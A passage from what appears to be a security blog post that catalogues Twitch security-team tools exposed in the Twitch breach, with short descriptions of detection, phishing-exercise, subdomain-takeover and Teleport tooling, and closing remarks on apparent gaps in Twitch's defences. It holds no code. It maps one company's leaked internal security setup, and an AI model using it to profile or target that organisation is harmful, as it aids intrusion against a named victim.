&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TTP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google-apps&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gsuite&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;84) Tool&lt;/strong&gt;: sirt-detection-ec2-instances&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This repository contains provisioning scripts that initialize Windows and macOS machines and install detection agents. The detection agents used in the scripts are: CrowdStrike Falcon and Uptycs.&lt;/p&gt;

&lt;p&gt;It uses Terraform to deploy the machine, Bash for macOS machines, and Powershell for Windows machines.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crowdstrike&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptycs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec2&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;85) Tool&lt;/strong&gt;: sirt-dns_report&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This script is made for continuous monitoring purposes of the DNS infrastructure of Twitch. Twitch has a service called “changelog” that contains the DNS records of Twitch, and can be called through a REST API.&lt;/p&gt;

&lt;p&gt;The script pulls all the changelog, and sends an alert for changes to Twitch security email that automatically creates a JIRA ticket based on the email.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dns&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infrasec&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;86) Tool&lt;/strong&gt;: sirt-gophish&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Re-deployable gophish infra for SIRT to run phishing exercises. It also includes Terraform code for deploying gophish with all the required configuration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gophish&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phishing&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;87) Tool&lt;/strong&gt;: sirt-jira-issue-escalator&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Lambda function that pulls data from JIRA through a JQL query that fetches tickets not marked as “Done”, and then pushes metrics to CloudWatch.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudwatch&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;88) Tool&lt;/strong&gt;: SIRT-JiraBot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: JiraBot is modeled after Dropbox’s SecurityBot https://github.com/dropbox/securitybot.&lt;/p&gt;

&lt;p&gt;It includes JQL queries, interactive messages for Slack.&lt;/p&gt;

&lt;p&gt;The purpose of the tool is to allow interaction with security projects on JIRA. It runs on AWS Lambda.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;securitybot&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slack&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;89) Tool&lt;/strong&gt;: sirt-jirahandler&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An incomplete project. It manages Jira tickets through the Jira Python library.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jria&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;90) Tool&lt;/strong&gt;: sirt-misp-cdk&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: CloudFormation port of a MISP deployment in Pulumi. A work-in-progress project.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pulumi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;91) Tool&lt;/strong&gt;: sirt-pulumi&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A customized version of https://github.com/MISP/misp-docker.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pulumi&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;92) Tool&lt;/strong&gt;: sirt-report&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script that pulls open incidents from JIRA and sends it as an email to Twitch security team as a report.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;incident-response&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reporting&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;93) Tool&lt;/strong&gt;: sirtbot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Slack bot that is based off a fork of https://github.com/lins05/slackbot.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slack&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;94) Tool&lt;/strong&gt;: SIRTGuardDutyRole-cloudformation&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A cloudformation config to enable Twitch SIRT to access GuardDuty in the target account.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guardduty&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;95) Tool&lt;/strong&gt;: sirtjira&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Another library to interact with Jira. It has the capability to create issues, manage issues, add comments, and other similar features.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;96) Tool&lt;/strong&gt;: sirtlib&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An automation Python library to interact with Splunk, Uptycs, Amazon Anamoli (Internal Amazon Security service), and Salesforce IDM.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splunk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amazon&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;salesforce&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptycs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;97) Tool&lt;/strong&gt;: slaughter_bot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An automation bot that can send emails, pull open risks and incidents from Jira, and put them into Spreadsheet.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spreadsheet&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;98) Tool&lt;/strong&gt;: sonarvet&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A report parser for SonarQube written in Golang.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sonarqube&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;99) Tool&lt;/strong&gt;: spark_from_athena_uptycs&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script to generate queries for AWS Spark and AWS Glue. It seems to use AWS Athena and Uptycs for the queries.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;athena&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws-athena&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws-spark&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws-glue&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptycs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;100) Tool&lt;/strong&gt;: splunk-hec-go&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Splunk HEC Golang Library. It’s a forked version of https://github.com/fuyufjh/splunk-hec-go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splunk&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;101) Tool&lt;/strong&gt;: splunk-saved-searches&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Repository to manage the configuration for saved searches/alerting in Splunk to be integrated with an automated deployment lambda function.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splunk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;incident-response&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;102) Tool&lt;/strong&gt;: squidmetrics&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Squid statsd publisher. This python script scrapes metrics from Squid (using the local manager
interface) and writes them to statsd/statsite.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squid&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metrics&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;103) Tool&lt;/strong&gt;: ssm-logging-enrollment&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: ssm-logging-enrollment. A simple script to enable CloudWatch logging for SSM session manager.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudwatch&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssm&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session-manager&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logging&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;104) Tool&lt;/strong&gt;: subdomain_checker&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Subdomain Takeover Checker. Check if a list of sites is vulnerable to an S3 Bucket or Cloudfront CNAME Hijack.&lt;/p&gt;

&lt;p&gt;It has a feature to automatically claim vulnerable CloudFront and AWS S3 buckets that are not publicly claimed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subdomain-takeover&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudfront&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;105) Tool&lt;/strong&gt;: tails&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Empty repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;empty&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;106) Tool&lt;/strong&gt;: takeover_check&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: SIRT Takeover DNS Checker. Sweeps across domains to find subdomain takeover vulnerabilities.&lt;/p&gt;

&lt;p&gt;It checks for AWS Beanstalk, CloudFront, S3, and signs of misconfiguration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudfront&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subdomain-takeover&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;107) Tool&lt;/strong&gt;: teleport&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Teleport configuration repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;108) Tool&lt;/strong&gt;: teleport-configuration&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Teleport Configuration. This repository contains configuration files in YAML format for Teleport.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;109) Tool&lt;/strong&gt;: teleport-dashboard&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Teleport dashboard.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;110) Tool&lt;/strong&gt;: teleport-dns-guardian&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Teleport DNS Guardian.
A small Python utility intended to be run as an AWS Lambda function. It can be used as part of a DNS round robin load balancing setup to keep the list of IPs in the DNS record updated based on Consul. It’s best to run once per minute.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;111) Tool&lt;/strong&gt;: teleport-enterprise-build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Teleport Enterprise package builder.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;112) Tool&lt;/strong&gt;: teleport-remote&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This includes the components to build and manage remote Teleport clusters.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;113) Tool&lt;/strong&gt;: teleport-util&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This contains utilities used for managing or automating the Teleport deployment at Twitch.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;114) Tool&lt;/strong&gt;: terraform&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Security-related Terraform configuration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;115) Tool&lt;/strong&gt;: tf-asg&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Terraform module to create and manage autoscalling group.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;116) Tool&lt;/strong&gt;: tf-lambda-dogfish-sg&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Terraform module to manage “dogfish” project.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;117) Tool&lt;/strong&gt;: tf-teleport&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Terraform module for setting up teleport.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;118) Tool&lt;/strong&gt;: tf-teleport-auth-lb&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Terraform module that creates a network loadbalancer for Teleport auth service.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;119) Tool&lt;/strong&gt;: tf-teleport-dns-guardian&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Terraform module for setting up a lambda function to manage Teleport’s DNS round robin records.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;120) Tool&lt;/strong&gt;: threat-modeling&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A repository that hosts a threat-modeling diagram built with PlantUML about a portion of Twitch threat-model.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-modeling&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;121) Tool&lt;/strong&gt;: tshproxy&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is a shim meant to wrap tsh and ssh for use in a ProxyCommand. It primarily
exists to automatically install or renew an SSH certificate if it is expired or
doesn’t exist.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;122) Tool&lt;/strong&gt;: twitch-bastion-util&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This script will automate the client-side configuration steps process for the
Twitch Bastion (an internal service). Specifically, it will install the Teleport client software and
configure the ssh client to access production via a bastion host.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;123) Tool&lt;/strong&gt;: twitch-glitch-bot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Slack bot that interacts with Jira, Slack and PagerDuty.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagerduty&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slack&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;124) Tool&lt;/strong&gt;: twitch-public-s3-bucket&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A CloudFormation template that provisions an internal S3 bucket.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;125) Tool&lt;/strong&gt;: TwitchyOmega&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A forked version of https://github.com/FelisCatus/SwitchyOmega.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SwitchyOmega&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chrome&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chrome-extension&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;126) Tool&lt;/strong&gt;: UbuntuVulnData&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A report parser tool that contextualizes vulnerability reports on Ubuntu AMIs that are not enriched with additional vulnerability details.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerability-management&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;127) Tool&lt;/strong&gt;: vacation-calendar&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Google Suite App that syncs team calendar when a member takes a vacation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google-suite&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gsuite&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;productivity&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;128) Tool&lt;/strong&gt;: wireguard-gateway&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Wireguard gateway: a framework to setup a full Wireguard infrastructure on AWS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wireguard&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;129) Tool&lt;/strong&gt;: yeti-infra&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An incomplete project. It’s a Terraform module for deploying YETI project for threat-intelligence.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-intelligence&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;

&lt;p&gt;Twitch Security invested thousands of hours in building its security tools and security program. I consider the tools developed internally to be advanced, well-thought and has done with excellent use-cases. At the time of writing the blog post, Twitch has not released a postmortem yet about the Twitch breach, how it happened, and technical details about the breach.&lt;/p&gt;

&lt;p&gt;Although the leaked security data covers the tools, it doesn’t cover the security architecture and the security program details. It’s hard to come up with a definite conclusion of how the breach could have happened.&lt;/p&gt;

&lt;p&gt;I can see that there is less focus on the tools for Identity Management and Access Control. Also, I can not see tools or references for the Security automation of SAST to scan the CI pipeline. Assets Discovery is done well, but I can not see AWS-related checks for AWS Policies and Role-Based access validation.&lt;/p&gt;

&lt;p&gt;The continuous security scanning from an AppSec perspective seems limited from seeing the developed tools. It’s possible that Twitch is running COTS tools instead of building their tools internally, but this also is not clear, as I haven’t seen ingestion for commercial DAST tools.&lt;/p&gt;

&lt;p&gt;The Twitch breach acts as a reality check on organizations and companies that are building their security program. The possibility of a breach is always there, organizations can take the next step and work in “assume-breach” playbooks and build additional security controls for their security program.&lt;/p&gt;

&lt;h1 id=&quot;about-fullhuntio&quot;&gt;About FullHunt.io&lt;/h1&gt;
